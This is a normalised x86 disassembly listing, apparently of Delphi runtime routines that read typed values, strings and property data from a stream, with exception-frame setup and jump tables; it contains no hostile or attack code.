pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bb17
lea eax [ ebp - 0x8 ]
call sub_404e44
retn
sub_41bb20
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ esi ]
mov eax [ eax ]
call sub_4161b4
mov ebx eax
test ebx ebx
je r-xdata
call sub_41a528
lea edx [ ebp - 0x8 ]
mov eax edi
call ebx
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_41331c
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41bb68
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
push esi
push 0x0
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_419f94
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_416668
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41bba8
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_41bbf7
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41cd58
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_413860
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bbfe
lea eax [ ebp - 0x10 ]
call sub_4113f4
retn
sub_41bc04
push ebp
mov ebp esp
push 0x0
push 0x0
xor eax eax
push ebp
push sub_41bcb6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41aaf4
cmp al 0xd
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41b604
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_419f94
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_416668
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41c62c
lea eax [ ebp - 0x4 ]
call sub_406af4
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ ebp - 0x4 ]
call sub_413914
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bcbd
lea eax [ ebp - 0x8 ]
call sub_404e44
lea eax [ ebp - 0x4 ]
call sub_406af4
retn
sub_41bcc4
push ebp
mov ebp esp
push ecx
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41bfd0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov ebx [ eax ]
movzx eax [ ebx ]
cmp eax 0x10
ja r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bfd7
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_404e68
lea eax [ ebp - 0x24 ]
call sub_40566c
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_404e68
retn
jmp [ eax * 4 + jump_table_41bd53 ]
mov eax [ rw-data ]
call sub_41a510
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4132a8
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41aaf4
cmp al 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41abb4
movzx ecx al
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41331c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41ac14
movzx ecx ax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41331c
jmp r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_41b604
mov edx [ ebp - 0x1c ]
mov eax ebx
call sub_413180
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41331c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41b4b0
add esp 0xfffffff4
fstp [ esp ]
fwait
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_413654
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_41c48c
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41354c
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_41c548
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41357c
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41c370
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41331c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41aaf4
sub al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41aaf4
cmp al 0xd
jne r-xdata
push ebp
call sub_41bba8
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41b76c
push edx
push eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4138d8
jmp r-xdata
push ebp
call sub_41bc04
pop ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4132a8
test [ eax + 0x24 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41b700
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41331c
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41b604
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41bb20
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c62c
xor ecx ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41331c
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
lea edx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
call sub_41b604
mov ecx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c62c
mov ecx rw-data
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4138a0
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c62c
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4132a8
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41ac70
jmp r-xdata
jmp r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4138a0
jmp r-xdata
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_41b604
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41bb68
pop ecx
jmp r-xdata
sub_41bfdc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor esi esi
mov eax ebx
mov edx edi
call sub_404e98
jmp r-xdata
mov eax [ ebx ]
call sub_41634c
test al al
je r-xdata
inc esi
push ebx
mov [ ebp - 0x10 ] edi
mov [ ebp - 0xc ] 0xb
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx 0x1
mov eax r-xdata
call sub_40ada8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41c03c
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41c35d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41c42c
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_41c33b
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_41c2fc
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x11 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x28 ]
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_41c450
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_41c450
mov eax [ ebp - 0x1c ]
call sub_415f20
xor ecx ecx
mov dl 0x1
call [ eax + 0x2c ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_41c450
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x2
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_41c450
mov eax [ ebp - 0x30 ]
lea edx [ ebp - 0x2c ]
call sub_41bfdc
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_41c450
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x18 ] edx
push 0x1
mov eax [ ebp - 0xc ]
call sub_403e3c
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_415c70
mov edx [ ebp - 0x4 ]
mov [ edx + 0x84 ] eax
xor eax eax
push ebp
push sub_41c2a1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x1c ] edx
call sub_40710c
mov eax [ eax + 0x8 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x34 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
and [ eax + 0x1c ] 0xfffd
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_416668
xor eax eax
push ebp
push sub_41c27e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_416824
test eax eax
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c285
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x34 ] edx
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_403f64
inc ebx
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x10 ]
call sub_4167c8
mov edx [ eax ]
call [ edx + 0xc ]
inc [ ebp - 0x10 ]
dec ebx
jne r-xdata
sub_41c2d2
call sub_402dac
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_404854
jmp r-xdata
call sub_404800
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_41a214
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c342
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_41c301
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_41a3e0
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
call sub_404800
call sub_404854
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c342
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0xc ]
call sub_403f64
sub_41c370
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41c41a
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_41c3ed
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_41c62c
cmp al 0xb
je r-xdata
mov eax ebx
call sub_413128
mov eax [ eax + 0x1 ]
mov esi [ eax ]
xor ebx ebx
call sub_41a528
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_41a560
cmp eax 0x1f
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c421
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
lea edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_41c450
cmp [ ebp - 0x4 ] 0x0
je r-xdata
bts ebx eax
jmp r-xdata
sub_41c450
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41ab18
movzx ecx [ esp ]
mov eax esi
xor edx edx
call sub_404f34
mov eax esi
call j_sub_405330
mov edx eax
movzx ecx [ esp ]
mov eax ebx
call sub_41ab18
pop edx
pop esi
pop ebx
retn
sub_41c48c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41c539
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41aaf4
sub al 0x12
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_41c548
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4050e8
jmp r-xdata
sub al 0x2
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c540
lea eax [ ebp - 0x8 ]
call sub_40566c
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_41c62c
sub al 0x6
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_41ab18
jmp r-xdata
sub al 0x6
je r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_4055ac
mov edx [ esi ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_41ab18
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_41ab18
jmp r-xdata
jmp r-xdata
call sub_41a528
sub_41c548
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41c61f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41aaf4
sub al 0x6
je r-xdata
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_41c48c
mov edx [ ebp - 0xc ]
mov eax esi
call sub_4057bc
jmp r-xdata
sub al 0x6
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c626
lea eax [ ebp - 0xc ]
call sub_404e44
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_41c62c
sub al 0x12
je r-xdata
lea edx [ ebp - 0x8 ]
mov ecx 0x4
mov eax ebx
call sub_41ab18
mov eax esi
mov edx [ ebp - 0x8 ]
call sub_405970
mov ecx [ ebp - 0x8 ]
add ecx ecx
mov edx [ esi ]
mov eax ebx
call sub_41ab18
jmp r-xdata
sub al 0x2
je r-xdata
lea edx [ ebp - 0x8 ]
mov ecx 0x4
mov eax ebx
call sub_41ab18
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_4055ac
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax ebx
call sub_41ab18
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_406ecc
jmp r-xdata
jmp r-xdata
call sub_41a528
sub_41c640
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41c67c
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41c450
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c683
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_41c688
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_41a6fc
test al al
je r-xdata
mov eax [ ebx ]
call sub_41c73c
mov eax [ ebx ]
call sub_41b7b8
pop ebx
pop ebp
retn
sub_41c6b0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_41ab18
mov edx [ ebp - 0x4 ]
imul edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41cb48
pop ebx
pop ecx
pop ebp
retn
sub_41c6e0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_41a6fc
test al al
je r-xdata
mov eax [ ebx ]
call sub_41aaf4
add al 0xfe
sub al 0x3
jae r-xdata
mov eax [ ebx ]
call sub_41b7b8
pop ebx
pop ebp
retn
mov eax [ ebx ]
mov edx 0x1
call sub_41cb48
jmp r-xdata
mov eax [ ebx ]
call sub_41c73c
mov eax [ ebx ]
call sub_41a6fc
test al al
je r-xdata
mov eax [ ebx ]
call sub_41c8ec
mov eax [ ebx ]
call sub_41b7b8
sub_41c73c
push ebp
mov ebp esp
add esp 0xfffffff8
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41c8e1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41c62c
and eax 0x7f
cmp eax 0x15
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c8e8
lea eax [ ebp - 0x8 ]
call sub_404e44
retn
jmp [ eax * 4 + jump_table_41c773 ]
push ebp
call sub_41c688
pop ecx
jmp r-xdata
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_41cb48
jmp r-xdata
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_41cb48
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_41cb48
jmp r-xdata
mov edx 0xa
mov eax [ ebp - 0x4 ]
call sub_41cb48
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41c450
jmp r-xdata
push ebp
mov eax 0x1
call sub_41c6b0
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c640
jmp r-xdata
push ebp
mov eax 0x1
call sub_41c6b0
pop ecx
jmp r-xdata
push ebp
call sub_41c6e0
pop ecx
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_41cb48
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41cb48
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41cb48
jmp r-xdata
push ebp
mov eax 0x2
call sub_41c6b0
pop ecx
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41cb48
jmp r-xdata
push ebp
mov eax 0x1
call sub_41c6b0
pop ecx
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41cb48
sub_41c8ec
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41c929
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41c450
mov eax ebx
call sub_41c73c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c930
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_41c934
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_41c9cc
push [ fs : eax ]
mov [ fs : eax ] esp
test dl dl
je r-xdata
mov eax ebx
call sub_41a6fc
test al al
je r-xdata
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x28 ]
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_41c450
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_41c450
jmp r-xdata
mov eax ebx
call sub_41c8ec
mov eax ebx
call sub_41b7b8
jmp r-xdata
mov eax ebx
call sub_41a6fc
test al al
je r-xdata
mov dl 0x1
mov eax ebx
call sub_41c934
mov eax ebx
call sub_41b7b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c9d3
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_404e68
retn
sub_41c9dc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41ca81
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_404edc
xor eax eax
mov [ ebp - 0x8 ] eax
mov esi [ ebx + 0x1c ]
test esi esi
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_41df7c
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ca88
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
cmp [ ebx + 0x5a ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
push edi
lea eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dcac
call sub_4047d8
sub_41caac
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
cmp [ eax + 0x4a ] 0x0
je r-xdata
mov edx [ esi ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop edi
pop esi
pop ebx
retn
push esi
mov edi eax
mov ecx ebx
mov edx eax
mov eax [ edi + 0x4c ]
call [ edi + 0x48 ]
sub_41cad4
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov ecx esi
mov edx [ ebx + 0x18 ]
mov eax ebx
call sub_41aa44
mov [ esp ] eax
cmp [ esp ] 0x0
jne r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esp
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x6c ]
call [ ebx + 0x68 ]
mov eax [ ebx + 0x1c ]
cmp eax [ ebx + 0x18 ]
je r-xdata
mov eax esi
call sub_415e60
mov edx [ r-xdata ]
mov eax [ esp ]
call sub_404190
test al al
jne r-xdata
mov ecx esi
mov edx [ ebx + 0x1c ]
mov eax ebx
call sub_41aa44
mov [ esp ] eax
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
sub_41cb48
push ebx
push esi
add esp 0xffffff00
mov ebx edx
mov esi eax
test ebx ebx
jle r-xdata
add esp 0x100
pop esi
pop ebx
retn
cmp ebx 0x100
jle r-xdata
mov edx esp
mov ecx ebx
mov eax esi
call sub_41ab18
xor ebx ebx
mov edx esp
mov ecx 0x100
mov eax esi
call sub_41ab18
sub ebx 0x100
jmp r-xdata
test ebx ebx
jg r-xdata
sub_41cb90
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41cd39
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xa
call sub_41a5b4
xor eax eax
mov [ ebp - 0x10 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41cd14
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebp - 0x10 ] eax
lea edx [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_41ab18
mov eax [ ebp - 0x18 ]
cdq
push edx
push eax
mov eax [ ebp - 0xc ]
call sub_419344
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x18 ]
call sub_41ab18
push 0x400
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_419e48
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_41ccef
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebp - 0x14 ]
call sub_41c48c
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax [ ebp - 0x14 ]
call sub_41ab18
mov eax [ ebp - 0x18 ]
cdq
push edx
push eax
mov eax [ ebp - 0x10 ]
call sub_419344
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_41ab18
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_412e7c
test al al
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dc70
call sub_4047d8
lea eax [ ebp - 0x8 ]
call sub_406af4
mov ecx eax
